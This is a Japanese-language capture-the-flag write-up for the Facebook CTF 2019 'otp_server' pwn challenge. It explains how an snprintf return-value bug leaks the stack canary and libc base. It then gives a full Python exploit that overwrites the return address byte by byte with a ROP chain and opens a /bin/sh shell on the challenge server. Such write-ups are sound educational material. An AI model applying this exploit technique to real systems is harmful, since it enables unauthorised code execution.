# [pwn 410pts] otp_server - Facebook CTF 2019
64ビットで全部有効です。
```
$ checksec -f otp_server
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes	0		5	otp_server
```
一見問題なさそうですが、sprintfの処理にバグがあります。
snprintfでサイズを制限していますが、返り値として戻ってくるのは実際に書き込まれた文字数ではなく、書き込もうとした文字数になります。
したがって、たくさん書き込むとたくさん出力され、オーバーリードとなります。
また、keyとbufferが隣接しているのでstrlenで実際のサイズよりも大きく見せることができます。
これを使えばリターンアドレスをランダムなnonceで破壊できるのですが、コピーされるバッファはちゃんと変数のサイズ内なのでリターンアドレスを任意の値に変えられないように思えます。しかし、main関数を終える前にnonceの値を確認できるので、nonceの最終バイトが書き換えたい値になったら次のバイトを書き換える、という具合で1バイトずつ書き換えられます。競技中にこれ思いついたのえらい。

```python
from ptrlib import *

def set_key(key):
    sock.recvuntil(">>> ")
    sock.sendline("1")
    sock.recvline()
    sock.send(key)

def encrypt(msg):
    sock.recvuntil(">>> ")
    sock.sendline("2")
    sock.recvline()
    sock.send(msg)
    sock.recvline()
    return sock.recvline().rstrip()

libc = ELF("./libc-2.27.so")
#sock = Process("./otp_server")
sock = Socket("challenges3.fbctf.com", 1338)
delta = 0xe7

# Leak libc & canary
set_key("\xff" * 0x108)
result = encrypt("\xff" * 0x100)
canary = result[0x108:0x110]
addr_libc_start_main = u64(result[0x118:0x120])
libc_base = addr_libc_start_main - libc.symbol("__libc_start_main") - delta
dump("libc base = " + hex(libc_base))
dump(b"canary = " + canary)

def overwrite(pos, target):
    x = 0
    setFlag = True
    while True:
        if setFlag:
            setFlag = False
            set_key("A" * (0x18 + pos - x) + "\x00")
        nonce = u64(encrypt("A" * 0x100)[:4]) ^ 0x41414141
        if (target >> (8 * (7 - x))) & 0xff == nonce >> 24:
            print(hex(target), hex(nonce >> 8))
            setFlag = True
            x += 1
            if x == 8:
                break

rop_pop_rdi = libc_base + 0x0002155f
rop_pop_rsi = libc_base + 0x00023e6a
rop_pop_rax = libc_base + 0x000439c7
rop_ret = libc_base + 0x000008aa
rop_syscall = libc_base + 0x000013c0
overwrite(0x30, rop_syscall)
overwrite(0x28, 59)
overwrite(0x20, rop_pop_rax)
overwrite(0x18, 0)
overwrite(0x10, rop_pop_rsi)
overwrite(0x08, libc_base + next(libc.find("/bin/sh")))
overwrite(0x00, rop_pop_rdi)

#_ = input()
sock.sendline("3")
sock.interactive()
```

# 感想
リモートで解くには時間がかかりますが、アイデアは面白かったです。